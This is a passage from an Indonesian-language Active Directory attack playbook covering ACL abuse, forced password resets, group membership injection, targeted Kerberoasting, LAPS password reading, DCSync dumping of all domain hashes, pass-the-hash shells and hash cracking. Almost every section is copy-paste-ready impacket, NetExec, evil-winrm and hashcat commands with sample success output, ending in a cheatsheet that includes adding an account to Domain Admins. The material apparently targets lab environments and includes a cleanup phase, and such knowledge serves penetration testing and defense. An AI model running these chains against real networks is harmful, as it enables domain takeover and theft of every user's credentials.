impacket-secretsdump \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    -just-dc \
    2>/dev/null | tee ~/acl_loot/hashes/dcsync_dump.txt

# Lihat hasil
grep ":::" ~/acl_loot/hashes/dcsync_dump.txt | head -10
```

---

### PATH 2E — ForceChangePassword

> **Prasyarat:** BloodHound menunjukkan `ForceChangePassword` dari account kita ke target

Bash

```
export TARGET_USER="alice"

# Method 1: net rpc (dari Linux, paling reliable)
net rpc password "$TARGET_USER" "NewPass2024!" \
    -U "$DOMAIN/$USERNAME%$PASSWORD" \
    -S $DC_IP
```

**OUTPUT BERHASIL ✅:**

text

```
[+] Password was changed successfully.
```

Bash

```
# Method 2: Impacket changepasswd
impacket-changepasswd \
    "$DOMAIN/$TARGET_USER@$DC_IP" \
    -newpass 'NewPass2024!' \
    -altuser "$DOMAIN/$USERNAME" \
    -altpass "$PASSWORD" \
    -no-pass 2>/dev/null

# Validasi
nxc smb $DC_IP -u "$TARGET_USER" -p "NewPass2024!"
echo "$TARGET_USER:NewPass2024!" >> ~/acl_loot/creds/found_creds.txt
```

**OUTPUT GAGAL ❌ — Failed to set password:**

text

```
[-] Failed to change password for alice
```

➡️ Kemungkinan Protected Users group:

Bash

```
# Cek protected users
ldapsearch -x -H ldap://$DC_IP \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "CN=Protected Users,CN=Users,DC=corp,DC=local" \
    "(objectClass=group)" \
    member 2>/dev/null

# Jika alice di Protected Users → password tidak bisa diubah tanpa old password
# → Coba path lain: GenericWrite + SPN injection instead
```

---

### PATH 2F — AddMember / AddSelf

> **Prasyarat:** BloodHound menunjukkan `AddMember` dari account kita ke group target

Bash

```
export TARGET_GROUP="IT Admins"  # Group yang bisa membuka akses lebih besar

# Method 1: net rpc (dari Linux)
net rpc group addmem "$TARGET_GROUP" "$USERNAME" \
    -U "$DOMAIN/$USERNAME%$PASSWORD" \
    -S $DC_IP
```

**OUTPUT BERHASIL ✅:**

text

```
Added user SVC_WEB to IT Admins.
```

Bash

```
# PENTING: Group membership baru tidak langsung aktif di session saat ini!
# Harus buat session baru atau refresh token

# Verifikasi membership di directory
ldapsearch -x -H ldap://$DC_IP \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "DC=corp,DC=local" \
    "(sAMAccountName=$USERNAME)" \
    memberOf 2>/dev/null | grep memberOf

# Test privilege baru dengan credential baru session
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD"
# Mungkin perlu tunggu token refresh (~15 menit) atau login ulang
```

**OUTPUT GAGAL ❌ — Access denied:**

text

```
net rpc: NT_STATUS_UNSUCCESSFUL
```

➡️ Coba via ldapmodify:

Bash

```
# Cari DN dari group dulu
ldapsearch -x -H ldap://$DC_IP \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "DC=corp,DC=local" \
    "(sAMAccountName=$TARGET_GROUP)" \
    distinguishedName 2>/dev/null | grep dn:

# Ambil DN user kita
OUR_DN=$(ldapsearch -x -H ldap://$DC_IP \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "DC=corp,DC=local" \
    "(sAMAccountName=$USERNAME)" \
    distinguishedName 2>/dev/null | grep "^dn:" | head -1 | awk '{print $2}')

echo "[*] Our DN: $OUR_DN"
```

---

## ═══════════════════════════════════════

## FASE 3: ACL CHAINING — MULTI-HOP ATTACK

## ═══════════════════════════════════════

> **Mindset:** Single ACE sering tidak langsung ke DA. Chainkan beberapa edge. Setelah setiap perubahan, **SELALU re-enumerate!**

### Contoh Chain Lengkap

Bash

```
# SKENARIO:
# svc_web → GenericWrite → alice → AddMember → IT Admins → CanRDP → DC01

echo "=== CHAIN ATTACK SEQUENCE ==="

# STEP 1: Abuse GenericWrite ke alice (inject SPN + Kerberoast)
echo "[1] Injecting SPN to alice..."
impacket-addspn -u "$DOMAIN/$USERNAME" -p "$PASSWORD" \
    -s "http/fake" -t "alice" $DC_IP 2>/dev/null

impacket-GetUserSPNs -dc-ip $DC_IP \
    $DOMAIN/$USERNAME:$PASSWORD \
    -request-user "alice" \
    -outputfile ~/acl_loot/hashes/alice_kerb.txt 2>/dev/null

# Crack
hashcat -m 13100 ~/acl_loot/hashes/alice_kerb.txt \
    /usr/share/wordlists/rockyou.txt --force -q 2>/dev/null
ALICE_PASS=$(hashcat -m 13100 ~/acl_loot/hashes/alice_kerb.txt --show 2>/dev/null | \
    awk -F: '{print $NF}')

echo "[+] Alice password: $ALICE_PASS"

# STEP 2: Login sebagai alice
nxc smb $DC_IP -u "alice" -p "$ALICE_PASS"
echo "alice:$ALICE_PASS" >> ~/acl_loot/creds/found_creds.txt

# STEP 3: Sebagai alice, abuse AddMember ke IT Admins
net rpc group addmem "IT Admins" "alice" \
    -U "$DOMAIN/alice%$ALICE_PASS" \
    -S $DC_IP

# STEP 4: Re-enumerate sebagai alice + member IT Admins
nxc smb $DC_IP -u "alice" -p "$ALICE_PASS"

# STEP 5: Test akses yang baru
evil-winrm -i $DC_IP -u "alice" -p "$ALICE_PASS"
```

---

### Langkah 3.1 — Re-enumerate Setelah Privilege Change (WAJIB!)

Bash

```
# Setiap kali privilege berubah, jalankan ini
export CURRENT_USER="alice"  # User yang sekarang dikontrol
export CURRENT_PASS="Password123!"

echo "=== RE-ENUMERATION AFTER PRIVILEGE CHANGE ==="

# Cek group membership baru
ldapsearch -x -H ldap://$DC_IP \
    -D "$CURRENT_USER@$DOMAIN" \
    -w "$CURRENT_PASS" \
    -b "DC=corp,DC=local" \
    "(sAMAccountName=$CURRENT_USER)" \
    memberOf 2>/dev/null | grep memberOf

# Test access ke service
echo "=== Service Access Test ==="
nxc smb $DC_IP -u "$CURRENT_USER" -p "$CURRENT_PASS"
nxc winrm $DC_IP -u "$CURRENT_USER" -p "$CURRENT_PASS"
nxc rdp $DC_IP -u "$CURRENT_USER" -p "$CURRENT_PASS"
nxc mssql $DC_IP -u "$CURRENT_USER" -p "$CURRENT_PASS"

# Re-collect BloodHound data dengan identity baru
bloodhound-python \
    -u "$CURRENT_USER" \
    -p "$CURRENT_PASS" \
    -ns $DC_IP -d $DOMAIN \
    -c All --zip \
    -o ~/acl_loot/bloodhound/ 2>/dev/null

echo "[*] Import BloodHound data baru dan mark $CURRENT_USER sebagai Owned"
```

---

## ═══════════════════════════════════════

## FASE 4: LAPS ABUSE (AllExtendedRights)

## ═══════════════════════════════════════

> **Prasyarat:** BloodHound menunjukkan `ReadLAPSPassword` atau `AllExtendedRights` ke computer object

### Langkah 4.1 — Baca LAPS Password

Bash

```
# Identifikasi tipe LAPS yang digunakan dulu
# Legacy LAPS: ms-MCS-AdmPwd
# Windows LAPS: msLAPS-Password / msLAPS-EncryptedPassword

# Command 1: Via NetExec (paling mudah)
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -M laps

# Command 2: Via LDAP query (legacy LAPS)
ldapsearch -x -H ldap://$DC_IP \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "DC=corp,DC=local" \
    "(objectClass=computer)" \
    ms-MCS-AdmPwd sAMAccountName 2>/dev/null | \
    grep -E "(sAMAccountName|ms-MCS-AdmPwd)" | \
    grep -v "^#" | paste - -

# Command 3: Via NetExec query (Windows LAPS)
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" \
    --query "(objectClass=computer)" \
    "msLAPS-Password sAMAccountName"
```

**OUTPUT BERHASIL ✅ — LAPS password terbaca:**

text

```
sAMAccountName: WKSTN01$
ms-MCS-AdmPwd: Ab3xK9!mZ2024

LDAP  10.10.10.100  DC01  [*] Getting LAPS Passwords
LDAP  10.10.10.100  DC01  Computer: WKSTN01$    LAPS Password: Ab3xK9!mZ2024
```

Bash

```
# Simpan dan test
export LAPS_TARGET="10.10.10.50"  # IP WKSTN01
export LAPS_PASS="Ab3xK9!mZ2024"
echo "Administrator@$LAPS_TARGET:$LAPS_PASS" >> ~/acl_loot/creds/found_creds.txt

# Test akses
nxc smb $LAPS_TARGET -u "Administrator" -p "$LAPS_PASS"

# Dump local SAM dari workstation
impacket-secretsdump "Administrator:$LAPS_PASS@$LAPS_TARGET"
```

**OUTPUT GAGAL ❌ — ms-MCS-AdmPwd kosong:**

text

```
# Atribut tidak ada atau tidak ada nilai
```

➡️ Kemungkinan:

1. Bukan legacy LAPS, coba Windows LAPS attribute
2. Account tidak punya ReadLAPSPassword yang benar
3. LAPS belum dikonfigurasi di komputer tersebut

Bash

```
# Coba Windows LAPS
ldapsearch -x -H ldap://$DC_IP \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "DC=corp,DC=local" \
    "(objectClass=computer)" \
    msLAPS-Password msLAPS-EncryptedPassword 2>/dev/null

# Cari di Google:
# "laps password not readable ldap query active directory"
```

---

## ═══════════════════════════════════════

## FASE 5: DCSYNC — DUMP SEMUA HASHES

## ═══════════════════════════════════════

> **Prasyarat:** Account memiliki `GetChanges` + `GetChangesAll` pada domain object, ATAU sudah menjadi Domain Admin/DA group

### Langkah 5.1 — Verifikasi DCSync Rights Dulu

Bash

```
# Cek apakah kita punya replication rights
impacket-dacledit -action read \
    -target-dn "DC=corp,DC=local" \
    -dc-ip $DC_IP \
    "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null | \
    grep -iE "(GetChanges|Replication|CORP\\\\$USERNAME)"
```

**OUTPUT BERHASIL ✅ — Punya replication rights:**

text

```
ACE[X]:
  Type: ACCESS_ALLOWED_ACE
  Principal: CORP\SVC_WEB
  Rights: DS_REPLICATION_GET_CHANGES
  
ACE[Y]:
  Type: ACCESS_ALLOWED_ACE
  Principal: CORP\SVC_WEB
  Rights: DS_REPLICATION_GET_CHANGES_ALL
```

---

### Langkah 5.2 — Eksekusi DCSync

Bash

```
# Method 1: Dump semua hash domain (UTAMA)
impacket-secretsdump \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    -just-dc \
    2>/dev/null | tee ~/acl_loot/hashes/dcsync_all.txt

# Method 2: Dump targeted user saja (lebih stealth)
impacket-secretsdump \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    -just-dc-user Administrator \
    2>/dev/null

# Method 3: Dengan NTLM hash (Pass-The-Hash)
impacket-secretsdump \
    -hashes "aad3b435b51404eeaad3b435b51404ee:$NTLM_HASH" \
    "$DOMAIN/$USERNAME@$DC_IP" \
    -just-dc \
    2>/dev/null
```

**OUTPUT BERHASIL ✅ — Hash domain terdump:**

text

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:FC525C9683E8FE067095BA2DDC971881:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2F3A9C...HASH...:::
svc_web:1104:aad3b435b51404eeaad3b435b51404ee:HASH:::
alice:1105:aad3b435b51404eeaad3b435b51404ee:HASH:::
```

Bash

```
# Ekstrak hash administrator untuk PTH
ADMIN_HASH=$(grep "^Administrator:" ~/acl_loot/hashes/dcsync_all.txt | \
    awk -F: '{print $4}')
KRBTGT_HASH=$(grep "^krbtgt:" ~/acl_loot/hashes/dcsync_all.txt | \
    awk -F: '{print $4}')

echo "[+] Administrator NTLM: $ADMIN_HASH"
echo "[+] krbtgt NTLM: $KRBTGT_HASH"

# Simpan
echo "Administrator NTLM Hash: $ADMIN_HASH" >> ~/acl_loot/creds/found_creds.txt
echo "krbtgt NTLM Hash: $KRBTGT_HASH" >> ~/acl_loot/creds/found_creds.txt
```

---

## ═══════════════════════════════════════

## FASE 6: POST ACL ABUSE — VALIDASI & PIVOT

## ═══════════════════════════════════════

### Langkah 6.1 — Pass-The-Hash (Setelah Dapat NTLM Hash)

Bash

```
# Setelah DCSync atau secretsdump, test PTH
export ADMIN_HASH="FC525C9683E8FE067095BA2DDC971881"
export FULL_HASH="aad3b435b51404eeaad3b435b51404ee:$ADMIN_HASH"

# Test PTH ke DC
nxc smb $DC_IP -u "Administrator" -H "$ADMIN_HASH"

# Test ke semua host di network
nxc smb 10.10.10.0/24 -u "Administrator" -H "$ADMIN_HASH" --no-bruteforce

# Shell dengan PTH
evil-winrm -i $DC_IP -u "Administrator" -H "$ADMIN_HASH"
impacket-psexec "Administrator@$DC_IP" -hashes "$FULL_HASH"
impacket-wmiexec "Administrator@$DC_IP" -hashes "$FULL_HASH"
```

**OUTPUT BERHASIL ✅ — PTH berhasil:**

text

```
SMB   10.10.10.100  445  DC01  [+] CORP\Administrator (Pwn3d!)
```

Bash

```
# Shell → dump credential untuk lateral movement
evil-winrm -i $DC_IP -u "Administrator" -H "$ADMIN_HASH" -c "whoami /all"
```

---

### Langkah 6.2 — Crack NTLM Hash Secara Offline

Bash

```
# Ekstrak semua NT hash dari DCSync dump
grep ":::" ~/acl_loot/hashes/dcsync_all.txt | \
    awk -F: '{print $4}' | \
    sort -u > ~/acl_loot/hashes/ntlm_only.txt

# Crack NT hash (mode 1000)
hashcat -m 1000 ~/acl_loot/hashes/ntlm_only.txt \
    /usr/share/wordlists/rockyou.txt \
    -w 3 --force 2>/dev/null

# Lihat hasil
hashcat -m 1000 ~/acl_loot/hashes/ntlm_only.txt --show 2>/dev/null

# Format: hash:password
# Cocokkan dengan username dari dcsync_all.txt
```

---

### Langkah 6.3 — Cross-Service Testing dengan Credentials Baru

Bash

```
# Setiap credential baru → test ke semua service!
export NEW_USER="alice"
export NEW_PASS="Password123!"

echo "=== Cross-Service Test untuk $NEW_USER ==="

# SMB
nxc smb $DC_IP -u "$NEW_USER" -p "$NEW_PASS"
nxc smb $DC_IP -u "$NEW_USER" -p "$NEW_PASS" --shares

# WinRM
nxc winrm $DC_IP -u "$NEW_USER" -p "$NEW_PASS"

# RDP
nxc rdp $DC_IP -u "$NEW_USER" -p "$NEW_PASS"

# MSSQL (jika port 1433 terbuka)
nxc mssql $DC_IP -u "$NEW_USER" -p "$NEW_PASS"

# SSH (jika ada Linux di network)
nxc ssh $DC_IP -u "$NEW_USER" -p "$NEW_PASS"
```

---

## ═══════════════════════════════════════

## FASE 7: CLEANUP (PENTING!)

## ═══════════════════════════════════════

> **Selalu cleanup** setelah ACL abuse untuk tidak meninggalkan backdoor yang tidak perlu.

Bash

```
echo "=== ACL ABUSE CLEANUP ==="

# 1. Hapus SPN yang ditambahkan (jika ada)
# impacket-addspn -u "$DOMAIN/$USERNAME" -p "$PASSWORD" -c -t "alice" $DC_IP

# 2. Hapus group membership yang ditambahkan
net rpc group delmem "IT Admins" "$USERNAME" \
    -U "$DOMAIN/$USERNAME%$PASSWORD" \
    -S $DC_IP 2>/dev/null

# 3. Hapus ACE yang ditambahkan (jika pakai WriteDACL)
impacket-dacledit \
    -action remove \
    -rights FullControl \
    -principal "$USERNAME" \
    -target "alice" \
    -dc-ip $DC_IP \
    "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null

# 4. Kembalikan owner (jika pakai WriteOwner)
impacket-owneredit \
    -action write \
    -new-owner "Domain Admins" \
    -target "alice" \
    -dc-ip $DC_IP \
    "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null

# 5. Hapus DCSync rights yang ditambahkan
impacket-dacledit \
    -action remove \
    -rights DCSync \
    -principal "$USERNAME" \
    -target-dn "DC=corp,DC=local" \
    -dc-ip $DC_IP \
    "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null

# Verifikasi cleanup
echo "[*] Cleanup verification:"
ldapsearch -x -H ldap://$DC_IP \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "DC=corp,DC=local" \
    "(sAMAccountName=$USERNAME)" \
    memberOf 2>/dev/null | grep memberOf
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`impacket-dacledit: not found`|Tool tidak terinstall|`pip3 install --upgrade impacket`|
|`Insufficient access rights`|ACE tidak tepat atau target salah|Verifikasi ACE via dacledit read, cek target DN|
|`The object class 'user' is invalid`|Target DN salah|Cari DN via ldapsearch `distinguishedName`|
|`WriteDACL berhasil tapi reset gagal`|Perlu tunggu propagasi|Cek DACL setelah write, verifikasi ACE masuk|
|`BloodHound: Could not bind LDAP`|Credentials atau DNS masalah|Tambahkan ke `/etc/hosts`, coba `--auth-method ntlm`|
|`ForceChangePassword failed`|Target di Protected Users|Cek `memberOf Protected Users`, coba SPN injection|
|`AddMember: Access denied`|Tidak punya AddMember right|Verifikasi edge di BloodHound, cek exact ObjectAceType|
|`net rpc: NT_STATUS_UNSUCCESSFUL`|SMB issue atau format salah|Coba `smbclient -L //$DC_IP/ -U "$DOMAIN/$USERNAME"` dulu|
|`DCSync: Access denied`|Belum punya replication rights|Verifikasi dacledit read domain object, cek GetChanges + GetChangesAll|
|`LAPS attribute empty`|Beda versi LAPS atau tidak punya rights|Coba `msLAPS-Password` (Windows LAPS)|
|`BloodHound no edges`|Data lama atau collection gagal|Re-collect dengan `--zip`, import ulang|
|`owneredit: target not found`|Identity tidak unik|Gunakan `sAMAccountName` atau full DN|
|`AddMember berhasil, akses belum ada`|Token/session belum refresh|Logout/login, buat session baru, tunggu ~15 menit|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Punya Credentials Baru
│
├─ FASE 0: Validasi Credential
│   ├─ [Valid] → Lanjut
│   ├─ [(Pwn3d!)] → Ke FASE 5 (DCSync langsung)
│   └─ [Invalid] → Kembali dapat credential yang benar
│
├─ FASE 1: ACL Enumeration
│   ├─ [BloodHound] → Mark as Owned → Cari outbound edges
│   ├─ [dacledit] → Manual ACL check per object
│   └─ [LAPS check] → ReadLAPSPassword?
│
├─ FASE 2: Exploit Berdasarkan ACE
│   ├─ [GenericAll → User] → Reset password / SPN inject
│   ├─ [GenericAll → Group] → AddMember → inherit privilege
│   ├─ [GenericWrite → User] → SPN inject → Kerberoast → crack
│   ├─ [WriteOwner] → Ownership → WriteDACL → FullControl
│   ├─ [WriteDACL → Object] → Add ACE → exploit
│   ├─ [WriteDACL → Domain] → Add DCSync rights
│   ├─ [ForceChangePassword] → Reset password
│   ├─ [AddMember] → Join privileged group
│   └─ [ReadLAPSPassword] → Get local admin creds → ke 05_smb
│
├─ FASE 3: Chaining Multi-Hop
│   └─ [Re-enumerate setelah setiap perubahan]
│
├─ FASE 4: LAPS Abuse
│   └─ [ReadLAPSPassword] → local admin creds → lateral movement
│
├─ FASE 5: DCSync (Endgame)
│   ├─ [Dump all hashes] → PTH → SYSTEM/DA
│   ├─ [krbtgt hash] → Golden Ticket (ke 43_domain_persistence)
│   └─ [crack NTLM] → plaintext passwords
│
└─ FASE 6: Post-Exploitation
    ├─ [PTH ke semua host]
    ├─ [Cross-service testing]
    └─ [Lateral movement ke 42_lateral_movement_workflow]
```

---

## Cross-Service & Next File Chart

text

```
Setelah ACL Abuse berhasil:
         │
         ├─ ─→ Dapat local admin creds (LAPS)  → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
         ├──→ WinRM Pwn3d                      → evil-winrm → 45_windows_privesc
         ├──→ NTLM hash dari DCSync            → PTH → 42_lateral_movement
         ├──→ krbtgt hash                      → 43_domain_persistence_workflow
         ├──→ Computer object control          → <a href="/docs/ad-delegation" class="text-[#00b4d8] hover:underline font-mono font-semibold">39_ad_delegation_workflow.md</a>
         └──→ Shell obtained                   → <a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">45_windows_privesc_workflow.md</a>
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export DC_IP="10.10.10.100"; export DOMAIN="corp.local"
export USERNAME="svc_web"; export PASSWORD="Summer2023!"
mkdir -p ~/acl_loot/{bloodhound,creds,hashes,notes}

# === BLOODHOUND COLLECTION ===
bloodhound-python -u "$USERNAME" -p "$PASSWORD" \
    -ns $DC_IP -d $DOMAIN -c All --zip -o ~/acl_loot/bloodhound/

# === MANUAL ACL ENUM ===
impacket-dacledit -action read -target "alice" \
    -dc-ip $DC_IP "$DOMAIN/$USERNAME:$PASSWORD"        # User ACL
impacket-dacledit -action read -target-dn "DC=corp,DC=local" \
    -dc-ip $DC_IP "$DOMAIN/$USERNAME:$PASSWORD"        # Domain ACL
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -M laps  # LAPS

# === GENERICALL/FORCECHANGEPASSWORD — RESET PASSWORD ===
net rpc password "alice" "NewPass2024!" \
    -U "$DOMAIN/$USERNAME%$PASSWORD" -S $DC_IP

# === GENERICWRITE — TARGETED KERBEROAST ===
impacket-addspn -u "$DOMAIN/$USERNAME" -p "$PASSWORD" \
    -s "http/fake" -t "alice" $DC_IP
impacket-GetUserSPNs -dc-ip $DC_IP $DOMAIN/$USERNAME:$PASSWORD \
    -request-user "alice" -outputfile ~/acl_loot/hashes/kerb.txt
hashcat -m 13100 ~/acl_loot/hashes/kerb.txt \
    /usr/share/wordlists/rockyou.txt --force

# === WRITEOWNER → WRITEDACL CHAIN ===
impacket-owneredit -action write -new-owner "$USERNAME" \
    -target "alice" -dc-ip $DC_IP "$DOMAIN/$USERNAME:$PASSWORD"
impacket-dacledit -action write -rights FullControl \
    -principal "$USERNAME" -target "alice" \
    -dc-ip $DC_IP "$DOMAIN/$USERNAME:$PASSWORD"

# === WRITEDACL → DCSYNC ===
impacket-dacledit -action write -rights DCSync \
    -principal "$USERNAME" -target-dn "DC=corp,DC=local" \
    -dc-ip $DC_IP "$DOMAIN/$USERNAME:$PASSWORD"

# === DCSYNC ===
impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" -just-dc
impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    -just-dc-user Administrator

# === ADDMEMBER ===
net rpc group addmem "Domain Admins" "$USERNAME" \
    -U "$DOMAIN/$USERNAME%$PASSWORD" -S $DC_IP

# === PTH SETELAH DCSync ===
export ADMIN_HASH="FC525C9683E8FE067095BA2DDC971881"
nxc smb $DC_IP -u "Administrator" -H "$ADMIN_HASH"
evil-winrm -i $DC_IP -u "Administrator" -H "$ADMIN_HASH"
impacket-psexec "Administrator@$DC_IP" \
    -hashes "aad3b435b51404eeaad3b435b51404ee:$ADMIN_HASH"

# === CLEANUP ===
net rpc group delmem "IT Admins" "$USERNAME" \
    -U "$DOMAIN/$USERNAME%$PASSWORD" -S $DC_IP
impacket-dacledit -action remove -rights FullControl \
    -principal "$USERNAME" -target "alice" \
    -dc-ip $DC_IP "$DOMAIN/$USERNAME:$PASSWORD"
```

---

> **➡️ NEXT:** Setelah dapat computer object control dari ACL abuse (GenericAll/GenericWrite → Computer), lanjut ke **`<a href="/docs/ad-delegation" class="text-[#00b4d8] hover:underline font-mono font-semibold">39_ad_delegation_workflow.md</a>`** untuk Resource-Based Constrained Delegation (RBCD) abuse — cara menggunakan computer object control untuk impersonasi user dan eskalasi privilege.